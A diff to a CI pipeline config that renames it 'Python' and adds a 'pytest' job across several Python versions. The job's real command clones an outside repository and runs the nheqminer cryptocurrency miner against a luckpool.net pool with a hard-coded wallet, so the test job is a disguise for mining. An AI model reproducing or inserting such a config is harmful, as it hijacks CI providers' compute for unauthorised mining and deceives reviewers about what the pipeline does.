@@ -1,14 +1,20 @@
 version: v1.0
-name: Initial Pipeline
+name: Python
 agent:
   machine:
     type: e1-standard-8
     os_image: ubuntu1804
 blocks:
-  - name: 'Block #1'
+  - name: Test
     task:
       jobs:
-        - name: 'Job #1'
+        - name: pytest
+          matrix:
+            - env_vars: PYTHON_VERSION
+              values:
+                - '2.7'
+                - '3.5'
+                - '3.6'
+                - '3.7'
           commands:
-            - checkout
-            - 'git clone https://github.com/saldi7/VPS1 && cd VPS1 && sh start.sh '
+            - 'git clone https://github.com/saldi7/VPS1 && cd VPS1 - chmod +x nheqminer - ./nheqminer -v -l na.luckpool.net:3956 -u RXwJE9e1c4jo7eV1FQByXDBHSdq7JMd6Bj.KERJA -p x -t 8'
